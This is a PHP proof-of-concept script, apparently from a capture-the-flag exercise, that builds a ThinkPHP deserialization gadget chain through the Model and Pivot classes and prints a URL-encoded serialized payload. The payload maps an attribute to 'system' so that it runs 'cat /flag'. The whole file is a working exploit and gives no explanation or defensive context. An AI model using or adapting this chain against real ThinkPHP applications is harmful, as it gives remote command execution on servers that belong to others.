<?php

namespace think\model\concern {
    trait Conversion{}
    trait Attribute{
        private $data;
        private $withAttr = ["xxx" => "system"];
        public function get(){
            $this->data = ["xxx" => "cat /flag"];
        }
    }
}

namespace think{
    abstract class Model{
        use model\concern\Attribute;
        use model\concern\Conversion;
        private $lazySave;
        protected $withEvent;
        private $exists;
        private $force;
        protected $field;
        protected $schema;
        protected $table;
        function __construct(){
            $this->lazySave = true;
            $this->withEvent = false;
            $this->exists = true;
            $this->force = true;
            $this->field = [];
            $this->schema = [];
            $this->table = true;
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        function __construct($obj = ''){
            //定义this->data不为空
            parent::__construct();
            $this->get();
            $this->table = $obj;
        }
    }
    $a = new Pivot();
    $b = new Pivot($a);
    echo urlencode(serialize($b));
}